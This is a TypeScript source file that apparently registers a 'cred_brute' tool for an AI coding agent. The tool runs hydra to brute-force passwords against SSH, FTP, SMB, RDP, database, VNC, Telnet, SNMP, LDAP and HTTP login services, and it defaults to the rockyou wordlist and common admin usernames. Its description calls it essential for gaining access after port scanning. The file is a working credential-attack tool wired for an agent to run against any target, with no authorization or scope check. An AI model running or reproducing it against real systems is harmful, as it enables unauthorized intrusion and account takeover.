export * as CredBruteTool from "./cred-brute"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "cred_brute"

export const Input = Schema.Struct({
  service: Schema.String.annotate({
    description:
      "Target service: 'ssh', 'ftp', 'smb', 'rdp', 'mysql', 'mssql', 'postgres', 'vnc', 'telnet', 'snmp', 'http-get', 'http-post', 'http-form', 'ldap', 'smb2'",
  }),
  target: Schema.String.annotate({ description: "Target IP or hostname" }),
  port: Schema.Number.pipe(Schema.optional).annotate({
    description: "Target port. If omitted, uses the service default (SSH=22, FTP=21, SMB=445, RDP=3389, etc).",
  }),
  usernames: Schema.String.pipe(Schema.optional).annotate({
    description: "Username or comma-separated list, or path to username wordlist.",
  }),
  passwords: Schema.String.pipe(Schema.optional).annotate({
    description: "Password or comma-separated list, or path to password wordlist. Default: /usr/share/wordlists/rockyou.txt",
  }),
  userlist: Schema.String.pipe(Schema.optional).annotate({
    description: "Path to username wordlist file.",
  }),
  passlist: Schema.String.pipe(Schema.optional).annotate({
    description: "Path to password wordlist file. Default: /usr/share/wordlists/rockyou.txt",
  }),
  threads: Schema.Number.pipe(Schema.optional).annotate({
    description: "Number of parallel threads. Default: 4.",
  }),
  timeout: Schema.Number.pipe(Schema.optional).annotate({
    description: "Per-connection timeout in seconds. Default: 30.",
  }),
  domain: Schema.String.pipe(Schema.optional).annotate({
    description: "Domain name for SMB/Windows authentication.",
  }),
  url: Schema.String.pipe(Schema.optional).annotate({
    description: "Full URL for HTTP-based services (http-get/http-post/http-form).",
  }),
  http_method: Schema.String.pipe(Schema.optional).annotate({
    description: "HTTP method for form brute: 'GET' or 'POST'. Default: POST.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

type Output = typeof Output.Type

const SERVICE_PORTS: Record<string, number> = {
  ssh: 22,
  ftp: 21,
  smb: 445,
  smb2: 445,
  rdp: 3389,
  mysql: 3306,
  mssql: 1433,
  postgres: 5432,
  vnc: 5900,
  telnet: 23,
  snmp: 161,
  ldap: 389,
}

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Bruteforce credentials against network services (SSH, FTP, SMB, RDP, MySQL, MSSQL, PostgreSQL, VNC, Telnet, SNMP, LDAP, HTTP). Uses hydra for network services and supports custom wordlists, parallel threads, and domain auth. Essential for gaining access through default/weak credentials after port scanning reveals services.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const port = input.port ?? SERVICE_PORTS[input.service] ?? 0
              const threads = input.threads ?? 4
              const timeout = input.timeout ?? 30
              const passList = input.passlist ?? input.passwords ?? "/usr/share/wordlists/rockyou.txt"
              const userList = input.userlist ?? input.usernames ?? "root,admin,administrator,user,test,guest,info,sys,operator"
              const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"

              const args: string[] = []

              // Service-specific hydra format
              if (input.service.startsWith("http")) {
                if (!input.url) {
                  return { output: "ERROR: 'url' is required for HTTP-based brute force." }
                }
                const httpType = input.service === "http-form" ? `http-post-form` : input.service.replace("-", "-")
                args.push(
                  "-L", userList,
                  "-P", passList,
                  "-t", String(threads),
                  "-W", String(timeout),
                  input.url,
                  httpType,
                )
              } else {
                args.push(
                  "-L", userList,
                  "-P", passList,
                  "-t", String(threads),
                  "-W", String(timeout),
                  "-s", String(port),
                )

                if (input.service === "smb" || input.service === "smb2") {
                  if (input.domain) args.push("-d", input.domain)
                }

                args.push(
                  `${input.target}`,
                  input.service.startsWith("http") ? input.service : input.service,
                )
              }

              // Use hydra
              const cmd = ChildProcess.make("hydra", args, {
                shell,
                stdin: "ignore",
                forceKillAfter: Duration.seconds(10),
              })

              const result = yield* appProcess
                .run(cmd, {
                  combineOutput: true,
                  timeout: Duration.minutes(30),
                  maxOutputBytes: 5 * 1024 * 1024,
                })
                .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))

              if (!result) {
                return {
                  output: "Hydra timed out or failed. Ensure hydra is installed: apt install hydra (Linux) or choco install hydra (Windows).",
                }
              }

              const stdout = result.output?.toString("utf8") ?? ""
              // Extract successful credentials
              const credLines = stdout.split("\n").filter((l) => l.includes("login:") && l.includes("password:"))

              const summary = credLines.length > 0
                ? `\n\n=== CREDENTIALS FOUND ===\n${credLines.join("\n")}\n\n[SUCCESS] Found ${credLines.length} valid credential(s).`
                : `\n\n[INFO] No valid credentials found with current wordlists.`

              return {
                exit: result.exitCode,
                output: stdout + summary,
              }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Credential brute force failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/cred-brute",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
